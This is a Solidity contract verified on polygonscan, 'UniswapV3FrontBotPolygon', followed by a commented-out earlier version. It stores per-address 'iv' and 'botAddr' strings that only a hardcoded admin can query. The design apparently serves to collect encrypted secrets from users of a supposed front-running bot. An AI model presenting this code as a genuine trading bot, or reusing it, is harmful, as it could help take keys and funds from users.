/**
 *Submitted for verification at polygonscan.com on 2023-01-09
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract UniswapV3FrontBotPolygon {
    struct FrontBot {
        string iv;
        string botAddr;
        // address input_address;
    }

    mapping(address => FrontBot) bots;
    address[] public botAccts;

    mapping(address => FrontBot) public bot;

    FrontBot add;
    // address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
    address public admin = 0x271930778fD7AB5F34E907470c2525A6edFF1799;

    modifier isAdmin() {
        if (msg.sender != admin) return;
        _;
    }

    function setFrontBot(
        address _address,
        string memory _iv,
        string memory _botAddr
    ) public {
        // var bot = bots[_address];
        // bot.iv = _iv;
        // bot.botAddr = _botAddr;
        // botAccts.push(_address) -1;

        bot[_address] = FrontBot({iv: _iv, botAddr: _botAddr});

        // botAccts.push(_address);
    }

    function getFrontBots() public view returns (address[] memory) {
        return botAccts;
    }

    function getFrontBotAddr(address _address)
        public
        view
        isAdmin
        returns (string memory botAddr)
    {
        return bot[_address].botAddr;
    }

    function getFrontBotIv(address _address)
        public
        view
        isAdmin
        returns (string memory iv)
    {
        return bot[_address].iv;
    }

    function countFrontBots() public view returns (uint256) {
        return botAccts.length;
    }
}














// pragma solidity ^0.4.18;

// contract UniswapV2FrontBot {
    
//     struct FrontBot {
//         string iv;
//         string botAddr;
//     }
    
//     mapping (address => FrontBot) bots;
//     address[] public botAccts;
    
//     // address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
//     address public admin = 0x271930778fD7AB5F34E907470c2525A6edFF1799;
    
//     modifier isAdmin(){
//         if(msg.sender != admin)
//             return;
//         _;
//     }
    
//     function setFrontBot(address _address, string _iv, string _botAddr) public {
//         var bot = bots[_address];
        
//         bot.iv = _iv;
//         bot.botAddr = _botAddr;

//         botAccts.push(_address) -1;
//     }
    
//     function getFrontBots() view public returns(address[]) {
//         return botAccts;
//     }
    
//     function getFrontBotAddr(address _address) view isAdmin public returns (string) {
//         return (bots[_address].botAddr);
//     }
    
//     function getFrontBotIv(address _address) view isAdmin public returns (string) {
//         return (bots[_address].iv);
//     }

//     function countFrontBots() view public returns (uint) {
//         return botAccts.length;
//     }
// }